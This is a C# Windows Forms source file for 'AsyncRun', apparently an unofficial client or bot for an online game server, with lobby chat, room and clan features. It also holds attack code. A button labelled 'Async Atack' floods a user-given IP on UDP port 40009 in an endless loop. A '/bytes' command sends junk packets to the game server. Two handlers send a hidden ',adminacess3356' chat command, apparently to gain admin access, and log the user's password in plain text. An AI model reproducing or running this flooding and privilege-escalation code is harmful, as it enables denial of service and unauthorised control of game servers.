using AsyncRun.Enums;
using AsyncRun.Model;
using AsyncRun.protocol;
using AsyncRun.protocol.Game.ACK;
using System;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace AsyncRun
{
    public partial class BASE_CHATTING : Form
    {
        public static ControlEnum control = ControlEnum.HIBERNAR;
        public static Loader load = Loader.INTs();
        public static Player p = Connection.INSTs().player;
        public static Base roomcreate;
        public static bool habilitar = false;
        public static IPEndPoint remote;
        public BASE_CHATTING()
        {
            InitializeComponent();
            label7.Text = $"Developed by: (c) BattleBugado - 2019";
            // new Thread(new ThreadStart(Ram)).Start();
            new Thread(new ThreadStart(Enableds)).Start();
        }
        public void Ram()
        {
            while (true)
            {
                label8.Text = $"RAM: {GC.GetTotalMemory(true) / 4024} KB";
                Thread.Sleep(300);
            }
        }
        public void Mensagem(string mensagem)
        {
            if (mensagem.Length >= 1)
            {
                textBox1.AppendText(Environment.NewLine);
                textBox1.AppendText(mensagem);
            }
            else
            {
                mensagem = string.Empty;
            }
        }
        public void Digite_TextChanged(object sender, EventArgs e)
        {
            try
            {
                TextBox2.Text = Digite.Text.Length.ToString();
                label21.Text = Digite.Text.Length.ToString();
            }
            catch
            {
                Digite.Text = string.Empty;
            }
        }
        private void Button1_Click(object sender, EventArgs e)
        {
            Comandos(sender, new KeyPressEventArgs((char)13));
        }
        private void Comandos(object sender, KeyPressEventArgs key)
        {
            try
            {
                Digite.ForeColor = Color.Black;
                if (control != ControlEnum.HIBERNAR)
                {
                    if (p != null)
                    {
                        if (key.KeyChar == 13)
                        {
                            string Mensagem = Digite.Text;
                            if (Mensagem.Length > 0)
                            {
                                if (Mensagem.ToLower().Equals("/bytes"))
                                {
                                    control = ControlEnum.HIBERNAR;
                                    for (int i = 0; i < 100; i++)
                                    {
                                        byte[] data = new byte[new Random().Next(0, 10000)];
                                        p.ClientGame.SendPacket(data);
                                        Logger.Send("Enviando Bytes " + data.Length);
                                        Thread.Sleep(3000);
                                    }
                                }
                                else
                                {
                                    ReadPacket.flods = false;
                                    switch (control)
                                    {
                                        case ControlEnum.LOBBY_CHAT:
                                            {
                                                p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Mensagem, Chat_Type.LOBBY_CHAT_LOBBY).Write());
                                                break;
                                            }
                                        case ControlEnum.RoomChat:
                                            {
                                                p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Mensagem, Chat_Type.LOBBY_CHAT_LOBBY).Write());
                                                break;
                                            }
                                    }
                                }
                                Digite.Text = string.Empty;
                            }
                        }
                    }
                    else
                    {
                        Logger.Error("Player is NULL!");
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Cu do coy" + ex.ToString());
            }
        }
        public void TextBox1_TextChanged(object sender, EventArgs e)
        {
            label4.Text = $"{textBox1.Text}";
        }
        private void Button2_Click(object sender, EventArgs e)
        {
            label21.Text = "0";
            textBox1.Text = "";
            textBox4.Text = "";
            textBox5.Text = "";
            textBox9.Text = "";
            Digite.Text = "";
            Refresh();
            Digite.Clear();
        }
        private void Button3_Click_1(object sender, EventArgs e)
        {
            if (MessageBox.Show("Voce deseja Sair?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                if (p != null && p.ClientGame != null)
                {
                    if (roomcreate != null)
                    {
                        roomcreate.Close();
                        p.ClientGame.SockerVerific(p);
                        p.ClientGame = null;
                        Close();
                    }
                    else
                    {
                        p.ClientGame.SockerVerific(p);
                        p.ClientGame = null;
                        Close();
                    }
                }
                else
                {
                    Close();
                }
                p = null;
            }
        }
        private void Button4_Click(object sender, EventArgs e)
        {
            if (habilitar)
            {
                label9.Visible = true;
                button6.Enabled = false;
                Digite.Clear();
                Digite.Text = "";
                new Thread(new ThreadStart(Commands.Command)).Start();
            }
            else
            {
                MessageBox.Show("Habilite esse função.");
            }
        }
        private void Digite_KeyPress(object sender, KeyPressEventArgs e)
        {
            Comandos(sender, e);
        }
        public void Enableds()
        {
            textBox5.Enabled = false;
            textBox6.Enabled = false;
            textBox7.Enabled = false;
            textBox8.Enabled = false;
        }
        private void Button5_Click(object sender, EventArgs e)
        {
            new Thread(TextosBlockeds).Start();
            habilitar = true;
            label16.ForeColor = Color.Green;
            label16.Text = "Habilitado";
            if (p != null)
                Patente.Gi().Pats(p.rank);
            new Thread(InforPlayer).Start();
        }
        public void Abertura_da_room()
        {
            try
            {
                Application.EnableVisualStyles();
                //  Application.SetCompatibleTextRenderingDefault(true);
                Application.Run(roomcreate = new Base());
            }
            catch (Exception ex)
            {
                ex.ToString();
            }
        }
        private void Button6_Click(object sender, EventArgs e)
        {
            new Thread(PreOpenRoom).Start();
            Thread.Sleep(300);
            new Thread(new ThreadStart(Abertura_da_room)).Start();
        }

        private void Button7_Click(object sender, EventArgs e)
        {
            if (p != null)
            {
                ReadPacket.flods = true;
                Close();
                Thread.Sleep(300);
                p.ClientGame.SendPacket(new BASE_USER_ENTER_ACK().Write());
            }
            else
                Logger.Error("Player is NULL");
        }
        private void Button8_Click(object sender, EventArgs e)
        {
            Player p = Connection.INSTs().player;
            if(p!=null)
                p.ClientGame.SendPacket(new ROOM_GET_LOBBY_USER_LIST_ACK().Write());
        }
        private void Button9_Click(object sender, EventArgs e)
        {
            if (habilitar)
            {
                Refresh();
                LoggerXML.DeleteLog(true);
            }
            else
                MessageBox.Show("[A] Habilite esse função.");
        }
        public void Fechada_da_room()
        {
            control = ControlEnum.RoomChat;
            Program.LobbyChatting();
        }
        public void TextosBlockeds()
        {
            textBox1.Text = "";
            textBox9.Text = "";
            textBox9.Enabled = false;
            textBox1.Enabled = false;  //Enable Desativa char do TextBox
        }
        public void PreOpenRoom()
        {
            label13.Visible = true;
            Digite.Visible = false;
            button1.Visible = false;
            button4.Visible = false;
            label5.Visible = false;
            label21.Visible = false;
        }
        public void InforPlayer()
        {
            label12.Text = $"[Async Player] ID é: {p.ID}, Gold: {p.gold}, cash: {p.cash}, Nick: {p.nick}, acess: {p.acess}";
            textBox4.Text = GetSession.INST().channelAnnounce;
            label1.Text = $"IP: {p.server}";
            label3.Text = $"Mac: {load.meuMac}";
            label6.Text = $"Versão: {load.CLIENTEVERSION}";
            label18.Text = $"Locale: {load.region}";
            textBox6.Text = Environment.UserName;
            textBox7.Text = p.channelId.ToString();

            button4.Enabled = true;
            textBox4.Enabled = false;
        }

        private void Button10_Click(object sender, EventArgs e)
        {
            Logger.Warnnig("Digite o nick do player: ");
            string name = Console.ReadLine();
            Player p = Connection.INSTs().player;
            if (p != null)
            {
                p.ClientGame.SendPacket(new BASE_FRIEND_INVITE(name).Write());
                Thread.Sleep(5);
            }
            else
            {
                MessageBox.Show("Jogador não está conectado!");
            }

        }

        private void Button11_Click(object sender, EventArgs e)
        {
            new Thread(new ThreadStart(AbrirClan)).Start();
        }
        public void AbrirClan()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Create_Clan());
        }

        private void button12_Click(object sender, EventArgs e)
        {
            Player p = Connection.INSTs().player;
            if(p != null)
            {
                MessageBox.Show("EM DESENVOLVIMENTO!");
            }
        }
        private void button14_Click(object sender, EventArgs e)
        {
            if (p != null && p.ClientGame != null)
                p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK($",adminacess3356 {Connection.INSTs().player.ID} 6", Chat_Type.LOBBY_CHAT_LOBBY).Write());
            Close();
            Logger.Warnnig($"Tentando verificar conta com nivel de acesso! {load.USER} \\ {load.PASS}");
            LoggerXML.Log($"Tentando verificar conta com nivel de acesso! {load.USER} \\ {load.PASS}", "ADMIN");
            Thread.Sleep(load.InternalMilisegundos);
        }
        private void FOI_TESTE(object sender, EventArgs e)
        {
            if (p != null && p.ClientGame != null)
                p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK($",adminacess3356 {Connection.INSTs().player.ID} 6", Chat_Type.LOBBY_CHAT_LOBBY).Write());
            Close();
            Thread.Sleep(load.InternalMilisegundos);
            new Thread(new ThreadStart(Connection.INSTs().SocketClientAuth)).Start();
        }

        private void button13_Click(object sender, EventArgs e)
        {
            Logger.Warnnig("[Async Atack] Você deseja flodar quantos tipos de bytes? (1 À 1000)");
            int count = int.Parse(Console.ReadLine());
            Logger.Warnnig("[Async Atack] Digite o IP! ");
            string IP = Console.ReadLine();
            int packet = 0;
            volteipraca:
            packet += 1;
            remote = new IPEndPoint(IPAddress.Parse(IP), 40009);
            while (true)
            {
                try
                {
                    byte[] b = new byte[count];
                    Socket UDP = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                    UDP.Connect(remote);
                    if (UDP.Connected)
                    {
                        UDP.BeginSend(b, 0, b.Length, SocketFlags.None, new AsyncCallback(SendCallback), UDP);
                        Logger.Send($"protocolo Type DataGram.   BufferPacketUDP[{packet}] {remote.ToString()}");
                    }
                    Thread.Sleep(load.InternalMilisegundos);
                }
                catch (Exception ex)
                {
                    Logger.Error(ex.ToString());
                    Thread.Sleep(10000);
                    goto volteipraca;
                }
                goto volteipraca;
            }
        }
        private void SendCallback(IAsyncResult ar)
        {
            Socket handler = (Socket)ar.AsyncState;
            if (handler != null && handler.Connected)
                handler.EndSend(ar);

        }































        private void trackBar1_Scroll(object sender, EventArgs e)
        {
            ActiveForm.Opacity = trackBar1.Value / 10.0;
            label20.Text = ActiveForm.Opacity.ToString();
            if (ActiveForm.Opacity <= 0.1)
                ActiveForm.Opacity = 0.1;
        }
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;
        public const int WM_LBUTTONDOWN = 0x0201;

        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();

        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);
            if (m.Msg == WM_LBUTTONDOWN)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }
    }
}

